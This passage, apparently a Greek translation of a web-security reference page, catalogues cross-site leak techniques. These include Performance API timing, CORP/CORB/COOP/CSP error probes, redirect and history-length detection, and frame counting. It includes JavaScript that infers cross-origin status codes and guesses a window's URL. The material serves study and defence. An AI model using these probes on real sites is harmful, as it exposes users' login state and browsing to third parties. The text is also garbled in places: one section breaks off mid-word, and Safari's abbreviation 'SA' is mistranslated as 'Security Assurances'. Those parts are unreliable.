Αυτή η πληθώρα δεδομένων μπορεί να ανακτηθεί μέσω μεθόδων όπως η [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ή η [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), παρέχοντας μια συνολική εικόνα των σχετικών με την απόδοση πληροφοριών. Επιπλέον, το API διευκολύνει τη μέτρηση των χρόνων εκτέλεσης υπολογίζοντας τη διαφορά μεταξύ σημείων χρόνου που λαμβάνονται από το [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Ωστόσο, αξίζει να σημειωθεί ότι για ορισμένες λειτουργίες σε προγράμματα περιήγησης όπως το Chrome, η ακρίβεια του `performance.now()` μπορεί να περιορίζεται σε χιλιοστά του δευτερολέπτου, πράγμα που μπορεί να επηρεάσει τη λεπτομέρεια των μετρήσεων χρονισμού.

Πέρα από τις μετρήσεις χρονισμού, το Performance API μπορεί να αξιοποιηθεί για εισαγωγές σχετικές με την ασφάλεια. Για παράδειγμα, η παρουσία ή η απουσία σελίδων στο αντικείμενο `performance` στο Chrome μπορεί να υποδείξει την εφαρμογή των `X-Frame-Options`. Συγκεκριμένα, εάν μια σελίδα αποκλείεται από την απεικόνιση σε ένα πλαίσιο λόγω των `X-Frame-Options`, δεν θα καταγραφεί στο αντικείμενο `performance`, παρέχοντας ένα διακριτικό ίχνος σχετικά με τις πολιτικές πλαισίωσης της σελίδας.
### Ανακατεύθυνση Έναρξης Διαρροής

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Ανακατεύθυνση
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Σύνοψη:** Η είσοδος χρονοδιαγράμματος διαρρέει την ώρα έναρξης μιας ανακατεύθυνσης.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Βρήκαμε ένα παράδειγμα XS-Leak που εκμεταλλεύεται τη συμπεριφορά ορισμένων προγραμμάτων περιήγησης που καταγράφουν υπερβολικές πληροφορίες για αιτήσεις διασυνοριακής πρόσβασης. Το πρότυπο καθορίζει ένα υποσύνολο χαρακτηριστικών που πρέπει να οριστούν σε μηδέν για πόρους διασυνοριακής πρόσβασης. Ωστόσο, στο **SA** είναι δυνατό να ανιχνευθεί αν ο χρήστης ανακατευθύνθηκε από τη σελίδα στόχο, ερευνώντας το **Performance API** και ελέγχοντας τα δεδομένα χρονοδιαγράμματος **redirectStart**.

### Διάρκεια Διαρροής Ανακατεύθυνσης

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Ανακατεύθυνση
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Σύνοψη:** Η διάρκεια των χρονοδιαγραμμάτων είναι αρνητική όταν συμβαίνει μια ανακατεύθυνση.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

Στο GC, η **διάρκεια** για αιτήσεις που οδηγούν σε **ανακατεύθυνση** είναι **αρνητική** και μπορεί έτσι να **διακριθεί** από αιτήσεις που δεν οδηγούν σε ανακατεύθυνση.

### Διαρροή CORP

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδα
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Σύνοψη:** Οι πόροι που προστατεύονται με CORP δεν δημιουργούν εισόδους χρονοδιαγράμματος πόρων.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Σε ορισμένες περιπτώσεις, η είσοδος **nextHopProtocol** μπορεί να χρησιμοποιηθεί ως τεχνική διαρροής. Στο GC, όταν η **κεφαλίδα CORP** είναι ορισμένη, το nextHopProtocol θα είναι **κενό**. Σημειώστε ότι το SA δεν θα δημιουργήσει καθόλου είσοδο απόδοσης για πόρους που υποστηρίζονται από CORP.

### Εργαζόμενος Υπηρεσίας

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Χρήση API
* **Περισσότερες πληροφορίες**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Σύνοψη:** Ανίχνευση εάν ένας εργαζόμενος υπηρεσίας είναι εγγεγραμμένος για ένα συγκεκριμένο προέλευση.
* **Παράδειγμα Κώδικα**:

Οι εργαζόμενοι υπηρεσίας είναι περιβάλλοντα σεναρίων που λειτουργούν σε μια προέλευση. Τρέχουν στο παρασκήνιο μιας ιστοσελίδας και μπορούν να παρεμβαίνουν, να τροποποιούν και να **αποθηκεύουν πόρους** για τη δημιουργία εφαρμογών ιστού εκτός σύνδεσης.\
Εάν ένας **πόρος αποθηκεύεται** από έναν **εργαζόμενο υπηρεσίας** και προσπελαύνεται μέσω **iframe**, ο πόρος θα **φορτωθεί από την αποθήκευση του εργαζόμενου υπηρεσίας**.\
Για να ανιχνευθεί εάν ο πόρος φορτώθηκε από την αποθήκευση του εργαζόμενου υπηρεσίας, μπορεί να χρησιμοποιηθεί το **Performance API**.\
Αυτό θα μπορούσε επίσης να γίνει με μια επίθεση Timing (ελέγξτε το έγγραφο για περισσότερες πληροφορίες).

### Αποθήκευση

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Χρονοδιάγραμμα
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Σύνοψη:** Είναι δυνατό να ελεγχθεί αν ένας πόρος έχει αποθηκευτεί στην μνήμη cache.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Χρησιμοποιώντας το [Performance API](./#performance-api) είναι δυνατό να ελεγχθεί αν ένας πόρος έχει αποθηκευτεί στην μνήμη cache.

### Διάρκεια Δικτύου

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Σύνοψη:** Είναι δυνατό να ανακτηθεί η διάρκεια του δικτύου μιας αίτησης από το `performance` API.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Τεχνική Μηνυμάτων Σφαλμάτων

### Σφάλμα Πολυμέσων

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML (Βίντεο, Ήχος)
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Σύνοψη:** Στο Firefox είναι δυνατό να διαρρεύσει ακριβώς ο κωδικός κατάστασης μιας αίτησης διασυνοριακής πρόσβασης.
* **Παράδειγμα Κώδικα**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### CORS Σφάλμα

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδα
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Σύνοψη:** Στις Διαβεβαιώσεις Ασφαλείας (SA), τα μηνύματα σφαλμάτων CORS αποκαλύπτουν ακούσια τον πλήρη URL των ανακατευθυνθέντων αιτημάτων.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

### SRI Σφάλμα

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδα
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Σύνοψη:** Στις Διαβεβαιώσεις Ασφαλείας (SA), τα μηνύματα σφαλμάτων SRI αποκαλύπτουν ακούσια τον πλήρη URL των ανακατευθυνθέντων αιτημάτων.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

### Παραβίαση/Ανίχνευση CSP

* **Μέθοδοι Ενσωμάτωσης**: Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Σύνοψη:** Επιτρέποντας μόνο την ιστοσελίδα των θυμάτων στο CSP, εάν προσπαθήσουμε να αποκατευθύνουμε σε διαφορετικό τομέα, το CSP θα ενεργοποιήσει ένα ανιχνεύσιμο σφάλμα.
* **Παραδείγματα Κώδικα**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

### Προσαρμογή CSP

* **Μέθοδοι Ενσωμάτωσης**: Frames
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδα
* **Περισσότερες πληροφορίες**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Σύνοψη:** Οι κατευθυντήριες γραμμές CSP μπορούν να εξεταστούν χρησιμοποιώντας το χαρακτηριστικό iframe του CSP, αποκαλύπτοντας λεπτομέρειες πολιτικής.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

### **CORP**

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδα
* **Περισσότερες πληροφορίες**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Σύνοψη:** Οι πόροι που προστατεύονται με το Cross-Origin Resource Policy (CORP) θα εκτοξεύσουν ένα σφάλμα όταν ανακτηθούν από ένα μη επιτρεπόμενο προέλευση.
### CORB

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Επικεφαλίδες
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Σύνοψη**: Το CORB μπορεί να επιτρέψει σε επιτιθέμενους να ανιχνεύσουν όταν η **επικεφαλίδα `nosniff` είναι παρούσα** στο αίτημα.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Ελέγξτε τον σύνδεσμο για περισσότερες πληροφορίες σχετικά με την επίθεση.

### Σφάλμα CORS σε λανθασμένη ρύθμιση αντανάκλασης προέλευσης <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Επικεφαλίδες
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Σύνοψη**: Εάν η επικεφαλίδα Origin αντανακλάται στην επικεφαλίδα `Access-Control-Allow-Origin`, είναι δυνατόν να ελεγχθεί εάν ένας πόρος βρίσκεται ήδη στη μνήμη cache.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Στην περίπτωση που η **επικεφαλίδα Origin** αντανακλάται στην επικεφαλίδα `Access-Control-Allow-Origin`, ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτήν τη συμπεριφορά για να προσπαθήσει να **ανακτήσει** τον **πόρο** σε λειτουργία **CORS**. Εάν δεν προκαλείται **σφάλμα**, σημαίνει ότι αυτός ανακτήθηκε **σωστά από τον ιστό**, ενώ εάν προκαλείται **σφάλμα**, σημαίνει ότι ανακτήθηκε από την **μνήμη cache** (το σφάλμα εμφανίζεται επειδή η μνήμη cache αποθηκεύει μια απόκριση με μια επικεφαλίδα CORS που επιτρέπει τον αρχικό τομέα και όχι τον τομέα του επιτιθέμενου).\
Να σημειωθεί ότι εάν η προέλευση δεν αντανακλάται αλλά χρησιμοποιείται ένας μπαλαντέρ (`Access-Control-Allow-Origin: *`) αυτό δεν θα λειτουργήσει.

## Τεχνική Αναγνώσιμων Χαρακτηριστικών

### Ανακατεύθυνση Fetch

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες Πληροφορίες**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Σύνοψη:** Οι GC και SA επιτρέπουν τον έλεγχο του τύπου απάντησης (opaque-redirect) μετά την ολοκλήρωση της ανακατεύθυνσης.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Υποβάλλοντας ένα αίτημα χρησιμοποιώντας το Fetch API με `redirect: "manual"` και άλλες παραμέτρους, είναι δυνατό να διαβάσετε το χαρακτηριστικό `response.type` και εάν είναι ίσο με `opaqueredirect` τότε η απάντηση ήταν μια ανακατεύθυνση.

### COOP

* **Μέθοδοι Ενσωμάτωσης**: Αναδυόμενα παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Επικεφαλίδα
* **Περισσότερες Πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Σύνοψη:** Οι σελίδες που προστατεύονται από την πολιτική Cross-Origin Opener (COOP) εμποδίζουν την πρόσβαση από διασταυρούμενες παρεμβολές.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Ένας επιτιθέμενος είναι ικανός να συμπεράνει την παρουσία της επικεφαλίδας Cross-Origin Opener Policy (COOP) σε μια απόκριση HTTP διασταυρούμενης προέλευσης. Η COOP χρησιμοποιείται από τις ιστοσελίδες για να εμποδίσουν εξωτερικές ιστοσελίδες από το να λάβουν αυθαίρετες αναφορές παραθύρων. Η ορατότητα αυτής της επικεφαλίδας μπορεί να διακριθεί με την προσπάθεια πρόσβασης στην **αναφορά `contentWindow`**. Σε περιπτώσεις όπου η COOP εφαρμόζεται συνθηκικά, η ιδιότητα **`opener`** γίνεται ένα ενδεικτικό στοιχείο: είναι **απροσδιόριστο** όταν η COOP είναι ενεργή και **ορισμένο** στην απουσία της.

### Μέγιστο Μήκος URL - Πλευρά Διακομιστή

* **Μέθοδοι Ενσωμάτωσης**: Fetch API, Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης / Περιεχόμενο
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Σύνοψη:** Ανίχνευση διαφορών στις απαντήσεις λόγω του μεγέθους απάντησης ανακατεύθυνσης που μπορεί να είναι τόσο μεγάλο ώστε ο διακομιστής να απαντά με σφάλμα και να δημιουργείται μια ειδοποίηση.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Εάν μια ανακατεύθυνση στην πλευρά του διακομιστή χρησιμοποιεί **είσοδο χρήστη μέσα στην ανακατεύθυνση** και **επιπλέον δεδομένα**. Είναι δυνατό να ανιχνευτεί αυτή η συμπεριφορά επειδή συνήθως οι **διακομιστές** έχουν ένα **όριο μήκους αιτήματος**. Αν τα **δεδομένα χρήστη** είναι αυτό το **μήκος - 1**, επειδή η **ανακατεύθυνση** χρησιμοποιεί **αυτά τα δεδομένα** και **προσθέτει** κάτι **επιπλέον**, θα προκαλέσει ένα **σφάλμα που είναι ανιχνεύσιμο μέσω των Error Events**.

Εάν μπορείτε κάπως να ορίσετε cookies σε έναν χρήστη, μπορείτε επίσης να πραγματοποιήσετε αυτήν την επίθεση με το **να ορίσετε αρκετά cookies** ([**cookie bomb**](../hacking-with-cookies/cookie-bomb.md)) έτσι με την **αύξηση του μεγέθους απάντησης** της **σωστής απάντησης** θα προκληθεί ένα **σφάλμα**. Σε αυτήν την περίπτωση, να θυμάστε ότι εάν προκαλέσετε αυτό το αίτημα από την ίδια τοποθεσία, το `<script>` θα στείλει αυτόματα τα cookies (έτσι μπορείτε να ελέγξετε για σφάλματα).\
Ένα παράδειγμα του **cookie bomb + XS-Search** μπορεί να βρεθεί στην Επιθυμητή λύση αυτού του άρθρου: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Το `SameSite=None` ή να βρίσκεστε στον ίδιο περιβάλλον είναι συνήθως απαραίτητο για αυτόν τον τύπο επίθεσης.

### Μέγιστο Μήκος URL - Πλευρά Πελάτη

* **Μέθοδ
### Μέγιστες Ανακατευθύνσεις

* **Μέθοδοι Ενσωμάτωσης**: Fetch API, Frames
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες Πληροφορίες**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Σύνοψη:** Χρησιμοποιήστε το όριο ανακατευθύνσεων του προγράμματος περιήγησης για να εξακριβώσετε την εμφάνιση ανακατευθύνσεων URL.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Εάν ο **μέγιστος** αριθμός **ανακατευθύνσεων** προς παρακολούθηση από ένα πρόγραμμα περιήγησης είναι **20**, ένας επιτιθέμενος θα μπορούσε να προσπαθήσει να φορτώσει τη σελίδα του με **19 ανακατευθύνσεις** και τελικά να **στείλει το θύμα** στη δοκιμαζόμενη σελίδα. Εάν προκληθεί ένα **σφάλμα**, τότε η σελίδα προσπαθούσε να **ανακατευθύνει το θύμα**.

### Μήκος Ιστορικού

* **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Ανακατευθύνσεις
* **Περισσότερες Πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Σύνοψη:** Ο κώδικας JavaScript διαχειρίζεται το ιστορικό περιήγησης του προγράμματος περιήγησης και μπορεί να προσπελαστεί από την ιδιότητα μήκους.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

Η **Ιστορική API** επιτρέπει στον κώδικα JavaScript να διαχειρίζεται το ιστορικό περιήγησης του προγράμματος περιήγησης, το οποίο **αποθηκεύει τις σελίδες που έχει επισκεφθεί ένας χρήστης**. Ένας επιτιθέμενος μπορεί να χρησιμοποιήσει την ιδιότητα μήκους ως μέθοδο ενσωμάτωσης: για να ανιχνεύσει την πλοήγηση JavaScript και HTML.\
**Έλεγχος του `history.length`**, κάνοντας έναν χρήστη να **πλοηγηθεί** σε μια σελίδα, να την **αλλάξει** πίσω στην ίδια προέλευση και να **ελέγξει** τη νέα τιμή του **`history.length`**.

### Μήκος Ιστορικού με το ίδιο URL

* **Μέθοδοι Ενσωμάτωσης**: Frames, Pop-ups
* **Ανιχνεύσιμη Διαφορά**: Αν το URL είναι το ίδιο με αυτό που υποθέτουμε
* **Σύνοψη:** Είναι δυνατό να υποθέσουμε αν η τοποθεσία ενός πλαισίου/παραθύρου βρίσκεται σε ένα συγκεκριμένο URL καταχρώντας το μήκος του ιστορικού.
* **Παράδειγμα Κώδικα**: Παρακάτω

Ένας επιτιθέμενος θα μπορούσε να χρησιμοποιήσει κώδικα JavaScript για να **διαχειριστεί την τοποθεσία του πλαισίου/παραθύρου σε ένα υποθετικό URL** και **άμεσα** να το **αλλάξει σε `about:blank`**. Εάν το μήκος του ιστορικού αυξηθεί, σημαίνει ότι το URL ήταν σωστό και είχε χρόνο να **αυξηθεί επειδή το URL δεν φορτώνεται εκ νέου αν είναι το ίδιο**. Αν δεν αυξηθεί, σημαίνει ότι **προσπάθησε να φορτώσει το υποθετικό URL** αλλά επειδή **άμεσα μετά** φορτώθηκε το **`about:blank`**, το **μήκος του ιστορικού δεν αυξήθηκε ποτέ** κατά τη φόρτωση του υποθετικού URL.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Μέτρηση Κάδρων

* **Μέθοδοι Ενσωμάτωσης**: Κάδρα, Αναδυόμενα παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Σύνοψη:** Αξιολογήστε την ποσότητα των στοιχείων iframe ελέγχοντας την ιδιότητα `window.length`.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Η **μέτρηση του αριθμού των καδρών** σε μια ιστοσελίδα που ανοίγεται μέσω `iframe` ή `window.open` μπορεί να βοηθήσει στον προσδιορισμό της **κατάστασης του χρήστη σε αυτήν τη σελίδα**.\
Επιπλέον, αν η σελίδα έχει πάντα τον ίδιο αριθμό καδρών, ο έλεγχος **συνεχώς** του αριθμού των καδρών μπορεί να βοηθήσει στον εντοπισμό ενός **προτύπου** που μπορεί να διαρρεύσει πληροφορίες.

Ένα παράδειγμα αυτής της τεχνικής είναι ότι στο chrome, ένα **PDF** μπορεί να **ανιχνευθεί** με τη **μέτρηση κάδρων** επειδή χρησιμοποιείται εσωτερικά ένα `embed`. Υπάρχουν [Παράμετροι Ανοίγματος URL](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) που επιτρέπουν κάποιο έλεγχο επί του περιεχομένου όπως `zoom`, `view`, `page`, `toolbar` όπου αυτή η τεχνική θα μπορούσε να είναι ενδιαφέρουσα.

### Στοιχεία HTMLElements

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Σύνοψη:** Διαβάστε τη διαρρεύσα αξία για να διακρίνετε μεταξύ 2 πιθανών καταστάσεων
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Η διαρροή πληροφοριών μέσω στοιχείων HTML αποτελεί ανησυχία στην ασφάλεια του web, ειδικά όταν δημιουργούνται δυναμικά αρχεία πολυμέσων βάσει πληροφοριών χρήστη, ή όταν προστίθενται υδατογραφήματα, αλλάζοντας το μέγεθος του πολυμέσου. Αυτό μπορεί να εκμεταλλευτείται από επιτιθέμενους για να διακρίνουν μεταξύ πιθανών καταστάσεων αναλύοντας τις πληροφορίες που αποκαλύπτονται από συγκεκριμένα στοιχεία HTML.

### Πληροφορίες που Αποκαλύπτονται από Στοιχεία HTML

* **HTMLMediaElement**: Αυτό το στοιχείο αποκαλύπτει τους χρόνους `διάρκειας` και `buffered` του πολυμέσου, τα οποία μπορούν να προσπελαστούν μέσω της API του. [Διαβάστε περισσότερα για το HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Αποκαλύπτει τα `videoHeight` και `videoWidth`. Σε ορισμένους περιηγητές, διατίθενται επιπλέον ιδιότητες όπως `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, και `webkitDecodedFrameCount`, προσφέροντας περισσότερες λεπτομέρειες σχετικά με το περιεχόμενο του πολυμέσου. [Διαβάστε περισσότερα για το HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Αυτή η συνάρτηση παρέχει λεπτομέρειες σχετικά με την ποιότητα αναπαραγωγής βίντεο, συμπεριλαμβανομένου του `totalVideoFrames`, το οποίο μπορεί να υποδείξει την ποσότητα των δεδομένων βίντεο που επεξεργάστηκαν. [Διαβάστε περισσότερα για το getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Αυτό το στοιχείο διαρρέει το ύψος `height` και το πλάτος `width` μιας εικόνας. Ωστόσο, εάν μια εικόνα είναι μη έγκυρη, αυτές οι ιδιότητες θα επιστρέψουν 0, και η λειτουργία `image.decode()` θα απορριφθεί, υποδεικνύοντας την αποτυχία φόρτωσης της εικόνας με σωστό τρόπο. [Διαβάστε περισσότερα για το HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### Ιδιότητα CSS

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Σύνοψη:** Αναγνωρίστε τις διακυμάνσεις στη μορφοποίηση της ιστοσελίδας που συσχετίζονται με την κατάσταση ή τον χρήστη.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

